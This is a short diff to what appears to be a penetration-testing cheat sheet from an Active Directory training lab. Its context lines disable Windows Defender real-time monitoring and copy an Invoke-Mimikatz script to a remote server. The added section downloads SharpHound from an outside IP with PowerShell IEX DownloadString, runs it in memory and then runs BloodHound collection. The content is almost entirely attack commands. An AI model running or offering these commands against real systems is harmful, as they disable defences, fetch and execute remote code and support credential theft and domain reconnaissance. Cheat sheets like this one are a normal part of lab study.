@@ -2639,4 +2639,9 @@ Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
 Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorpadminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 .\InvokeMimikatzEx.ps1
 ```
-
+##### POWERSHELL - RODAR BLOODHOUND
+```
+IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/SharpHound.ps1")
+Invoke-BloodHound -CollectionMethod All -Verbose
+Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
+```
